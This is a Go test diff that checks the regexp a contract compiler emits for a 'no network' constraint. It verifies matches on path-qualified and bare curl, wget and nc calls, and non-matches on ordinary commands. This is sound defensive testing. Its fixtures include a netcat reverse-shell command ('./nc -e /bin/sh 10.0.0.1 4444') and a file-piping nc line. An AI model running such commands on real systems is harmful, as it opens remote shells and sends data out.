@@ -747,3 +747,92 @@ func TestCompile_RejectsAPatternMatchPathWouldReject(t *testing.T) {
 		})
 	}
 }
+
+// networkMatcher compiles a spec with one "no network" MUST-NOT constraint and
+// returns the regexp the compiler emitted for it. Going through Compile rather
+// than reaching for the unexported constant is deliberate: the pattern is only
+// ever used as the Pattern of an emitted Matcher, so that is the surface worth
+// pinning.
+func networkMatcher(t *testing.T) *regexp.Regexp {
+	t.Helper()
+	s := &spec.SkillSpec{
+		Name:        "netcheck",
+		Purpose:     "p",
+		Description: "d",
+		Triggers:    []spec.TriggerPhrase{{Text: "check"}},
+		Steps:       []spec.Step{{ID: "s1", Action: "Run scripts/check.py", Postcondition: "output exists"}},
+		Constraints: []spec.Rule{{
+			ID: "c1", Text: "no network access", Kind: spec.RuleMustNot, Severity: spec.SeverityCritical,
+		}},
+		TargetTier: spec.TierMid,
+	}
+	c, err := contract.Compile(s)
+	if err != nil {
+		t.Fatalf("Compile: %v", err)
+	}
+	if len(c.Forbid) != 1 {
+		t.Fatalf("compiled %d forbid rules, want 1", len(c.Forbid))
+	}
+	re, err := regexp.Compile(c.Forbid[0].Match.Pattern)
+	if err != nil {
+		t.Fatalf("emitted an uncompilable pattern %q: %v", c.Forbid[0].Match.Pattern, err)
+	}
+	return re
+}
+
+func TestNetworkMatcher_MatchesPathQualifiedInvocations(t *testing.T) {
+	re := networkMatcher(t)
+
+	// Every one of these is a real network call. A skill that shells out to an
+	// absolute path — or to ./nc after copying it into the workspace — is
+	// exactly the case a "no network" constraint at critical severity exists to
+	// catch, and a missed violation reads as a clean run.
+	for _, cmd := range []string{
+		"/usr/bin/curl https://example.com",
+		"./nc -e /bin/sh 10.0.0.1 4444",
+		"/bin/nc 10.0.0.1 4444",
+		"/usr/local/bin/wget -qO- https://example.com",
+		"sh -c '/usr/bin/curl https://example.com'",
+	} {
+		if !re.MatchString(cmd) {
+			t.Errorf("pattern did not match %q", cmd)
+		}
+	}
+}
+
+func TestNetworkMatcher_StillMatchesUnqualifiedInvocations(t *testing.T) {
+	re := networkMatcher(t)
+	for _, cmd := range []string{
+		"curl https://example.com",
+		"wget https://example.com",
+		"cat f | nc 10.0.0.1 4444",
+		"nc -l 8080",
+		`bash -c "curl https://example.com"`,
+	} {
+		if !re.MatchString(cmd) {
+			t.Errorf("pattern stopped matching %q", cmd)
+		}
+	}
+}
+
+func TestNetworkMatcher_DoesNotMatchOrdinaryCommands(t *testing.T) {
+	re := networkMatcher(t)
+
+	// "nc" is a substring of all of these. A false violation at critical
+	// severity is the heaviest penalty the scorer has, so the anchoring these
+	// cases pin is the reason the pattern is not a bare alternation.
+	for _, cmd := range []string{
+		"base64 --decode f",
+		"rsync -a src/ dst/",
+		"echo announce",
+		"python3 -c 'print(1)' # increment",
+		"cat docs/ncurses.md",
+		"jq .concat f.json",
+		"npm run sync",
+		"cd /usr/bin/encode && ls",
+	} {
+		if re.MatchString(cmd) {
+			t.Errorf("pattern matched ordinary command %q", cmd)
+		}
+	}
+}
